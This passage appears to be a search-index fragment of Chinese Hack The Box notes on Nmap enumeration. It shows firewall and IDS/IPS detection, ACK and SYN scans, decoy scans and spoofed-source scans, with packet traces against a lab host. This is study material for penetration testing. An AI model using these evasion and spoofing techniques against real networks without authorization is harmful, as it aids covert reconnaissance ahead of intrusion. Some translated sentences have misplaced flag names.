\u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3","text":"<p>\u9ed8\u8ba4\u626b\u63cf - \u627e\u5230\u6253\u5f00\u7684\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#-_3","title":"\u75af\u72c2\u626b\u63cf - \u53d1\u73b0\u5f00\u653e\u7aef\u53e3","text":"<p>\u75af\u72c2\u626b\u63cf - \u53d1\u73b0\u5f00\u653e\u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ cat tnet.T5 | grep \"/tcp\" | wc -l\n\n23\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5728https://nmap.org/book/man-performance.html\u627e\u5230\u6709\u5173\u626b\u63cf\u6027\u80fd\u7684\u66f4\u591a\u4fe1\u606f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_39","title":"\u7ed5\u8fc7\u5b89\u5168\u63aa\u65bd","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#idsips","title":"\u9632\u706b\u5899\u548c IDS/IPS \u89c4\u907f","text":"<p><code>Nmap</code>\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u8bb8\u591a\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u9632\u706b\u5899\u89c4\u5219\u548c IDS/IPS\u3002\u8fd9\u4e9b\u65b9\u6cd5\u5305\u62ec\u6570\u636e\u5305\u5206\u6bb5\u3001\u8bf1\u9975\u7684\u4f7f\u7528\u4ee5\u53ca\u6211\u4eec\u5c06\u5728\u672c\u8282\u4e2d\u8ba8\u8bba\u7684\u5176\u4ed6\u65b9\u6cd5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_40","title":"\u9632\u706b\u5899","text":"<p>\u9632\u706b\u5899\u662f\u4e00\u79cd\u9632\u6b62\u6765\u81ea\u5916\u90e8\u7f51\u7edc\u7684\u672a\u6388\u6743\u8fde\u63a5\u5c1d\u8bd5\u7684\u5b89\u5168\u63aa\u65bd\u3002\u6bcf\u4e2a\u9632\u706b\u5899\u5b89\u5168\u7cfb\u7edf\u90fd\u57fa\u4e8e\u4e00\u4e2a\u8f6f\u4ef6\u7ec4\u4ef6\uff0c\u8be5\u7ec4\u4ef6\u76d1\u89c6\u9632\u706b\u5899\u548c\u4f20\u5165\u6570\u636e\u8fde\u63a5\u4e4b\u95f4\u7684\u7f51\u7edc\u6d41\u91cf\uff0c\u5e76\u6839\u636e\u5df2\u8bbe\u7f6e\u7684\u89c4\u5219\u51b3\u5b9a\u5982\u4f55\u5904\u7406\u8fde\u63a5\u3002\u5b83\u68c0\u67e5\u5355\u4e2a\u7f51\u7edc\u6570\u636e\u5305\u662f\u5426\u88ab\u4f20\u9012\u3001\u5ffd\u7565\u6216\u963b\u6b62\u3002\u6b64\u673a\u5236\u65e8\u5728\u9632\u6b62\u53ef\u80fd\u5177\u6709\u6f5c\u5728\u5371\u9669\u7684\u4e0d\u9700\u8981\u7684\u8fde\u63a5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ips","title":"\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf/IPS","text":"<p>\u4e0e\u9632\u706b\u5899\u4e00\u6837\uff0c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\uff08<code>IDS</code>\uff09\u548c\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08<code>IPS</code>\uff09\u4e5f\u662f\u57fa\u4e8e\u8f6f\u4ef6\u7684\u7ec4\u4ef6\u3002<code>IDS</code>\u626b\u63cf\u7f51\u7edc\u4ee5\u5bfb\u627e\u6f5c\u5728\u7684\u653b\u51fb\uff0c\u5bf9\u5176\u8fdb\u884c\u5206\u6790\uff0c\u5e76\u62a5\u544a\u68c0\u6d4b\u5230\u7684\u4efb\u4f55\u653b\u51fb\u3002\u5982\u679c\u5e94\u8be5\u68c0\u6d4b\u5230\u6f5c\u5728\u7684\u653b\u51fb\uff0c\u5219\u91c7\u53d6\u7279\u5b9a\u7684\u9632\u5fa1\u63aa\u65bd\u4f5c\u4e3a<code>IPS</code>\u8865\u5145\u3002<code>IDS</code>\u6b64\u7c7b\u653b\u51fb\u7684\u5206\u6790\u57fa\u4e8e\u6a21\u5f0f\u5339\u914d\u548c\u7b7e\u540d\u3002\u5982\u679c\u68c0\u6d4b\u5230\u7279\u5b9a\u6a21\u5f0f\uff0c\u4f8b\u5982\u670d\u52a1\u68c0\u6d4b\u626b\u63cf\uff0c<code>IPS</code>\u53ef\u80fd\u4f1a\u963b\u6b62\u6302\u8d77\u7684\u8fde\u63a5\u5c1d\u8bd5\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_41","title":"\u786e\u5b9a\u9632\u706b\u5899\u53ca\u5176\u89c4\u5219","text":"<p>\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\uff0c\u5f53\u7aef\u53e3\u663e\u793a\u4e3a\u5df2\u8fc7\u6ee4\u65f6\uff0c\u53ef\u80fd\u6709\u591a\u79cd\u539f\u56e0\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u9632\u706b\u5899\u8bbe\u7f6e\u4e86\u7279\u5b9a\u7684\u89c4\u5219\u6765\u5904\u7406\u7279\u5b9a\u7684\u8fde\u63a5\u3002\u6570\u636e\u5305\u53ef\u4ee5\u662f<code>dropped</code>, \u6216<code>rejected</code>\u3002\u6570\u636e<code>dropped</code>\u5305\u88ab\u5ffd\u7565\uff0c\u4e3b\u673a\u4e0d\u8fd4\u56de\u4efb\u4f55\u54cd\u5e94\u3002</p> <p>\u8fd9\u5bf9\u4e8e<code>rejected</code>\u8fd4\u56de\u5e26\u6709<code>RST</code>\u6807\u5fd7\u7684\u6570\u636e\u5305\u662f\u4e0d\u540c\u7684\u3002\u8fd9\u4e9b\u6570\u636e\u5305\u5305\u542b\u4e0d\u540c\u7c7b\u578b\u7684 ICMP \u9519\u8bef\u4ee3\u7801\u6216\u6839\u672c\u4e0d\u5305\u542b\u4efb\u4f55\u5185\u5bb9\u3002</p> <p>\u6b64\u7c7b\u9519\u8bef\u53ef\u80fd\u662f\uff1a</p> <ul> <li>\u7f51\u7edc\u4e0d\u53ef\u8fbe</li> <li>\u7f51\u7edc\u7981\u6b62</li> <li>\u4e3b\u673a\u4e0d\u53ef\u8fbe</li> <li>\u4e3b\u673a\u7981\u6b62</li> <li>\u7aef\u53e3\u4e0d\u53ef\u8fbe</li> <li>\u539f\u578b\u65e0\u6cd5\u8bbf\u95ee</li> </ul> <p>Nmap \u7684 TCP ACK \u626b\u63cf ( ) \u65b9\u6cd5\u6bd4\u5e38\u89c4 SYN ( ) \u6216\u8fde\u63a5\u626b\u63cf ( )<code>-sA</code>\u66f4\u96be\u8fc7\u6ee4\u9632\u706b\u5899\u548c IDS/IPS \u7cfb\u7edf\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ea\u53d1\u9001\u5e26\u6709\u6807\u5fd7\u7684 TCP \u6570\u636e\u5305\u3002\u5f53\u7aef\u53e3\u5173\u95ed\u6216\u6253\u5f00\u65f6\uff0c\u4e3b\u673a\u5fc5\u987b\u54cd\u5e94\u4e00\u4e2a\u6807\u5fd7\u3002\u4e0e\u4f20\u51fa\u8fde\u63a5\u4e0d\u540c\uff0c\u6765\u81ea\u5916\u90e8\u7f51\u7edc\u7684\u6240\u6709\u8fde\u63a5\u5c1d\u8bd5\uff08\u5e26\u6709\u6807\u5fd7\uff09\u901a\u5e38\u90fd\u88ab\u9632\u706b\u5899\u963b\u6b62\u3002\u4f46\u662f\uff0c\u5e26\u6709\u6807\u5fd7\u7684\u6570\u636e\u5305\u5f80\u5f80\u4f1a\u88ab\u9632\u706b\u5899\u901a\u8fc7\uff0c\u56e0\u4e3a\u9632\u706b\u5899\u65e0\u6cd5\u786e\u5b9a\u8fde\u63a5\u9996\u5148\u662f\u4ece\u5916\u90e8\u7f51\u7edc\u8fd8\u662f\u5185\u90e8\u7f51\u7edc\u5efa\u7acb\u7684\u3002<code>-sS``sT``ACK``RST``SYN``ACK</code></p> <p>\u5982\u679c\u6211\u4eec\u67e5\u770b\u8fd9\u4e9b\u626b\u63cf\uff0c\u6211\u4eec\u5c06\u770b\u5230\u7ed3\u679c\u6709\u4f55\u4e0d\u540c\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_42","title":"\u540c\u6b65\u626b\u63cf","text":"<p>\u540c\u6b65\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:56 CEST\nSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:22 S ttl=53 id=22412 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;\nSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:25 S ttl=50 id=62291 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;\nSENT (0.0278s) TCP 10.10.14.2:57347 &gt; 10.129.2.28:21 S ttl=58 id=38696 iplen=44  seq=4092255222 win=1024 &lt;mss 1460&gt;\nRCVD (0.0329s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=40884 iplen=72 ]\nRCVD (0.0341s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;\nRCVD (1.0386s) TCP 10.129.2.28:22 &gt; 10.10.14.2:57347 SA ttl=64 id=0 iplen=44  seq=1153454414 win=64240 &lt;mss 1460&gt;\nSENT (1.1366s) TCP 10.10.14.2:57348 &gt; 10.129.2.28:25 S ttl=44 id=6796 iplen=44  seq=4092320759 win=1024 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.0053s latency).\n\nPORT   STATE    SERVICE\n21/tcp filtered ftp\n22/tcp open     ssh\n25/tcp filtered smtp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.07 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_43","title":"\u786e\u8ba4\u626b\u63cf","text":"<p>\u786e\u8ba4\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 14:57 CEST\nSENT (0.0422s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:21 A ttl=49 id=12381 iplen=40  seq=0 win=1024\nSENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:22 A ttl=41 id=5146 iplen=40  seq=0 win=1024\nSENT (0.0423s) TCP 10.10.14.2:49343 &gt; 10.129.2.28:25 A ttl=49 id=5800 iplen=40  seq=0 win=1024\nRCVD (0.1252s) ICMP [10.129.2.28 &gt; 10.10.14.2 Port 21 unreachable (type=3/code=3) ] IP [ttl=64 id=55628 iplen=68 ]\nRCVD (0.1268s) TCP 10.129.2.28:22 &gt; 10.10.14.2:49343 R ttl=64 id=0 iplen=40  seq=1660784500 win=0\nSENT (1.3837s) TCP 10.10.14.2:49344 &gt; 10.129.2.28:25 A ttl=59 id=21915 iplen=40  seq=0 win=1024\nNmap scan report for 10.129.2.28\nHost is up (0.083s latency).\n\nPORT   STATE      SERVICE\n21/tcp filtered   ftp\n22/tcp unfiltered ssh\n25/tcp filtered   smtp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 21,22,25</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sS</code> \u5728\u6307\u5b9a\u7aef\u53e3\u4e0a\u6267\u884c SYN \u626b\u63cf\u3002 <code>-sA</code> \u5bf9\u6307\u5b9a\u7aef\u53e3\u6267\u884c ACK \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <p>\u8bf7\u6ce8\u610f\u6211\u4eec\u4ece\u76ee\u6807\u6536\u5230\u7684 RCVD \u6570\u636e\u5305\u53ca\u5176\u8bbe\u7f6e\u6807\u5fd7\u3002\u4f7f\u7528 SYN \u626b\u63cf ( <code>-sS</code>)\uff0c\u6211\u4eec\u7684\u76ee\u6807\u5c1d\u8bd5\u901a\u8fc7\u53d1\u9001\u56de<code>SA</code>\u8bbe\u7f6e\u4e86 SYN-ACK () \u6807\u5fd7\u7684\u6570\u636e\u5305\u6765\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u800c\u4f7f\u7528 ACK \u626b\u63cf ( <code>-sA</code>)\uff0c\u6211\u4eec\u83b7\u5f97<code>RST</code>\u6807\u5fd7\uff0c\u56e0\u4e3a TCP \u7aef\u53e3 22 \u662f\u6253\u5f00\u7684\u3002\u5bf9\u4e8e TCP \u7aef\u53e3 25\uff0c\u6211\u4eec\u6ca1\u6709\u6536\u5230\u4efb\u4f55\u8fd4\u56de\u7684\u6570\u636e\u5305\uff0c\u8fd9\u8868\u660e\u6570\u636e\u5305\u5c06\u88ab\u4e22\u5f03\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#idsips_1","title":"\u68c0\u6d4b IDS/IPS","text":"<p>\u4e0e\u9632\u706b\u5899\u53ca\u5176\u89c4\u5219\u4e0d\u540c\uff0cIDS/IPS \u7cfb\u7edf\u7684\u68c0\u6d4b\u8981\u56f0\u96be\u5f97\u591a\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u88ab\u52a8\u6d41\u91cf\u76d1\u63a7\u7cfb\u7edf\u3002<code>IDS systems</code>\u68c0\u67e5\u4e3b\u673a\u4e4b\u95f4\u7684\u6240\u6709\u8fde\u63a5\u3002\u5982\u679c IDS \u53d1\u73b0\u5305\u542b\u5b9a\u4e49\u7684\u5185\u5bb9\u6216\u89c4\u8303\u7684\u6570\u636e\u5305\uff0c\u7ba1\u7406\u5458\u4f1a\u6536\u5230\u901a\u77e5\u5e76\u5728\u6700\u574f\u7684\u60c5\u51b5\u4e0b\u91c7\u53d6\u9002\u5f53\u7684\u63aa\u65bd\u3002</p> <p><code>IPS systems</code>\u91c7\u53d6\u7ba1\u7406\u5458\u81ea\u4e3b\u914d\u7f6e\u7684\u63aa\u65bd\uff0c\u81ea\u52a8\u9632\u8303\u6f5c\u5728\u653b\u51fb\u3002\u5fc5\u987b\u77e5\u9053 IDS \u548c IPS \u662f\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14 IPS \u662f\u5bf9 IDS \u7684\u8865\u5145\u3002</p> <p><code>VPS</code>\u5efa\u8bae\u4f7f\u7528\u591a\u4e2a\u5177\u6709\u4e0d\u540c IP \u5730\u5740\u7684\u865a\u62df\u4e13\u7528\u670d\u52a1\u5668 ( ) \u6765\u786e\u5b9a\u6b64\u7c7b\u7cfb\u7edf\u5728\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\u662f\u5426\u5728\u76ee\u6807\u7f51\u7edc\u4e0a\u3002\u5982\u679c\u7ba1\u7406\u5458\u5728\u76ee\u6807\u7f51\u7edc\u4e0a\u68c0\u6d4b\u5230\u6b64\u7c7b\u6f5c\u5728\u653b\u51fb\uff0c\u7b2c\u4e00\u6b65\u5c31\u662f\u963b\u6b62\u6f5c\u5728\u653b\u51fb\u6765\u81ea\u7684 IP \u5730\u5740\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u65e0\u6cd5\u518d\u4f7f\u7528\u8be5 IP \u5730\u5740\u8bbf\u95ee\u7f51\u7edc\uff0c\u6211\u4eec\u7684\u4e92\u8054\u7f51\u670d\u52a1\u63d0\u4f9b\u5546 ( <code>ISP</code>) \u5c06\u88ab\u8054\u7cfb\u5e76\u88ab\u963b\u6b62\u8bbf\u95ee\u4e92\u8054\u7f51\u3002</p> <ul> <li><code>IDS systems</code>\u901a\u5e38\u5355\u72ec\u5b58\u5728\u53ef\u4ee5\u5e2e\u52a9\u7ba1\u7406\u5458\u68c0\u6d4b\u5bf9\u5176\u7f51\u7edc\u7684\u6f5c\u5728\u653b\u51fb\u3002\u7136\u540e\u4ed6\u4eec\u53ef\u4ee5\u51b3\u5b9a\u5982\u4f55\u5904\u7406\u6b64\u7c7b\u8fde\u63a5\u3002\u6211\u4eec\u53ef\u4ee5\u89e6\u53d1\u7ba1\u7406\u5458\u7684\u67d0\u4e9b\u5b89\u5168\u63aa\u65bd\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u79ef\u6781\u626b\u63cf\u5355\u4e2a\u7aef\u53e3\u53ca\u5176\u670d\u52a1\u3002\u6839\u636e\u662f\u5426\u91c7\u53d6\u4e86\u5177\u4f53\u7684\u5b89\u5168\u63aa\u65bd\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u6d4b\u51fa\u7f51\u7edc\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u4e9b\u76d1\u63a7\u5e94\u7528\u3002</li> <li>\u786e\u5b9a<code>IPS system</code>\u76ee\u6807\u7f51\u7edc\u4e2d\u662f\u5426\u5b58\u5728\u6b64\u7c7b\u95ee\u9898\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u4ece\u5355\u4e2a\u4e3b\u673a\u8fdb\u884c\u626b\u63cf ( <code>VPS</code>)\u3002\u5982\u679c\u5728\u4efb\u4f55\u65f6\u5019\u8be5\u4e3b\u673a\u88ab\u963b\u6b62\u5e76\u4e14\u65e0\u6cd5\u8bbf\u95ee\u76ee\u6807\u7f51\u7edc\uff0c\u6211\u4eec\u5c31\u77e5\u9053\u7ba1\u7406\u5458\u5df2\u7ecf\u91c7\u53d6\u4e86\u4e00\u4e9b\u5b89\u5168\u63aa\u65bd\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u6211\u4eec\u7684\u6e17\u900f\u6d4b\u8bd5\u4e0e\u53e6\u4e00\u4e2a<code>VPS</code>\u3002</li> </ul> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053\u6211\u4eec\u9700\u8981\u66f4\u5b89\u9759\u5730\u8fdb\u884c\u626b\u63cf\uff0c\u5e76\u4e14\u5728\u6700\u597d\u7684\u60c5\u51b5\u4e0b\uff0c\u4f2a\u88c5\u4e0e\u76ee\u6807\u7f51\u7edc\u53ca\u5176\u670d\u52a1\u7684\u6240\u6709\u4ea4\u4e92\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_44","title":"\u8bf1\u9975","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u7ba1\u7406\u5458\u539f\u5219\u4e0a\u4f1a\u963b\u6b62\u6765\u81ea\u4e0d\u540c\u5730\u533a\u7684\u7279\u5b9a\u5b50\u7f51\u3002\u8fd9\u4f1a\u963b\u6b62\u5bf9\u76ee\u6807\u7f51\u7edc\u7684\u4efb\u4f55\u8bbf\u95ee\u3002\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f IPS \u4ec0\u4e48\u65f6\u5019\u5e94\u8be5\u963b\u6b62\u6211\u4eec\u3002\u56e0\u6b64\uff0c\u8bf1\u9975\u626b\u63cf\u65b9\u6cd5 ( <code>-D</code>) \u662f\u6b63\u786e\u7684\u9009\u62e9\u3002\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0cNmap \u4f1a\u751f\u6210\u5404\u79cd\u968f\u673a IP \u5730\u5740\uff0c\u5e76\u5c06\u5176\u63d2\u5165\u5230 IP \u6807\u5934\u4e2d\uff0c\u4ee5\u4f2a\u88c5\u6240\u53d1\u9001\u6570\u636e\u5305\u7684\u6765\u6e90\u3002\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u751f\u6210\u968f\u673a ( <code>RND</code>) \u4e2a\u7279\u5b9a\u6570\u91cf\uff08\u4f8b\u5982\uff1a<code>5</code>\uff09\u7684 IP \u5730\u5740\uff0c\u7528\u5192\u53f7 (<code>:</code>). \u7136\u540e\u6211\u4eec\u7684\u771f\u5b9e IP \u5730\u5740\u968f\u673a\u653e\u7f6e\u5728\u751f\u6210\u7684 IP \u5730\u5740\u4e4b\u95f4\u3002\u56e0\u6b64\uff0c\u5728\u4e0b\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u7684\u771f\u5b9e IP \u5730\u5740\u4f4d\u4e8e\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u3002\u53e6\u4e00\u4e2a\u5173\u952e\u70b9\u662f\u8bf1\u9975\u5fc5\u987b\u662f\u6d3b\u7684\u3002\u5426\u5219\uff0c\u7531\u4e8e SYN \u6cdb\u6d2a\u5b89\u5168\u673a\u5236\uff0c\u76ee\u6807\u4e0a\u7684\u670d\u52a1\u53ef\u80fd\u65e0\u6cd5\u8bbf\u95ee\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_45","title":"\u4f7f\u7528\u8bf1\u9975\u626b\u63cf","text":"<p>\u4f7f\u7528\u8bf1\u9975\u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST\nSENT (0.0378s) TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0378s) TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nRCVD (0.1370s) TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.099s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 80</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>-sS</code> \u5728\u6307\u5b9a\u7aef\u53e3\u4e0a\u6267\u884c SYN \u626b\u63cf\u3002 <code>-Pn</code> \u7981\u7528 ICMP Echo \u8bf7\u6c42\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-D RND:5</code> \u751f\u6210\u4e94\u4e2a\u968f\u673a IP \u5730\u5740\uff0c\u6307\u793a\u8fde\u63a5\u6765\u81ea\u7684\u6e90 IP\u3002 <p>\u6b3a\u9a97\u6027\u6570\u636e\u5305\u901a\u5e38\u4f1a\u88ab ISP \u548c\u8def\u7531\u5668\u8fc7\u6ee4\u6389\uff0c\u5373\u4f7f\u5b83\u4eec\u6765\u81ea\u76f8\u540c\u7684\u7f51\u7edc\u8303\u56f4\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u6211\u4eec\u7684 VPS \u670d\u52a1\u5668\u7684 IP \u5730\u5740\uff0c\u5e76\u7ed3\u5408<code>IP ID</code>IP \u6807\u5934\u4e2d\u7684\u201c\u201d\u64cd\u4f5c\u6765\u4f7f\u7528\u5b83\u4eec\u6765\u626b\u63cf\u76ee\u6807\u3002</p> <p>\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\u53ea\u6709\u4e2a\u522b\u5b50\u7f51\u65e0\u6cd5\u8bbf\u95ee\u670d\u52a1\u5668\u7684\u7279\u5b9a\u670d\u52a1\u3002\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u624b\u52a8\u6307\u5b9a\u6e90IP\u5730\u5740( <code>-S</code>) \u6765\u6d4b\u8bd5\u7528\u8fd9\u4e2a\u662f\u5426\u80fd\u5f97\u5230\u66f4\u597d\u7684\u7ed3\u679c\u3002\u8bf1\u9975\u53ef\u7528\u4e8e SYN\u3001ACK\u3001ICMP \u626b\u63cf\u548c\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u626b\u63cf\u3002\u90a3\u4e48\u8ba9\u6211\u4eec\u770b\u770b\u8fd9\u6837\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5e76\u786e\u5b9a\u5b83\u6700\u6709\u53ef\u80fd\u662f\u54ea\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_46","title":"\u6d4b\u8bd5\u9632\u706b\u5899\u89c4\u5219","text":"<p>\u6d4b\u8bd5\u9632\u706b\u5899\u89c4\u5219</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p445 -O\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:23 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.032s latency).\n\nPORT    STATE    SERVICE\n445/tcp filtered microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nToo many fingerprints match this host to give specific OS details\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 3.14 seconds\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip_3","title":"\u4f7f\u7528\u4e0d\u540c\u6e90 IP \u626b\u63cf","text":"<p>\u4f7f\u7528\u4e0d\u540c\u6e90 IP \u626b\u63cf</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.010s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 